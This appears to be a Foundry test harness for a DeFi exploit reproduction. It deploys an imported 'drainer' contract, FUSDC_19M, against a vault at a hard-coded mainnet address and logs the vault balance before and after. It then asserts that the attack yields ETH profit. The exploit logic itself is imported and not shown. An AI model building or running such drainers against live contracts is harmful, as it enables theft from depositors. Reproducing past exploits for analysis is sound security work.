// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "../exploit/Run.s.sol";

contract TestFUSDC19M is Test {
    function testExecute10() public {
        // Deploy the drainer
        FUSDC_19M drainer = new FUSDC_19M();

        uint256 vaultBefore = IHVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE).underlyingBalanceWithInvestment();
        emit log_named_uint("Vault USDC before", vaultBefore);

        // Execute 10 iterations
        drainer.execute(10);

        uint256 ethProfit = address(this).balance;
        uint256 vaultAfter = IHVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE).underlyingBalanceWithInvestment();

        emit log_named_uint("ETH profit (wei)", ethProfit);
        emit log_named_uint("Vault after", vaultAfter);
        emit log_named_int("Vault drained", int256(vaultBefore) - int256(vaultAfter));

        assertGt(ethProfit, 0, "No profit");
    }

    function testExecute1() public {
        FUSDC_19M drainer = new FUSDC_19M();

        uint256 vaultBefore = IHVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE).underlyingBalanceWithInvestment();
        emit log_named_uint("Vault USDC before", vaultBefore);

        drainer.execute(1);

        uint256 ethProfit = address(this).balance;
        uint256 vaultAfter = IHVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE).underlyingBalanceWithInvestment();

        emit log_named_uint("ETH profit (wei)", ethProfit);
        emit log_named_uint("Vault after", vaultAfter);
        emit log_named_int("Vault drained", int256(vaultBefore) - int256(vaultAfter));
    }

    receive() external payable {}
}
